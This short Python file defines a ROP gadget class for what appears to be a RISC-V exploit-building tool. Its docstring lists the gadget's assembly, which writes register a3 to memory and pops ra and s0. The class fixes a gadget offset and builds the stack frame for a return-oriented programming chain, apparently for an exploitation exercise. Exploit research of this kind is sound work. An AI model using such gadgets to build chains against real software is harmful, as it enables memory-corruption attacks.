from bf_parser.rop_gadgets_base_class import ROP_Gadget

class CopyA3(ROP_Gadget):
    '''
    sw a3, 0(s0)
    li a0, 0
    ld ra, 0x8(sp)
    ld s0, 0(sp)
    addi sp, sp, 0x10
    jr ra
    '''
    def __init__(self):
        super().__init__(0x1643a, 0x10)

    def construct_frame(self, ra=0, s0=0):
        data = [s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()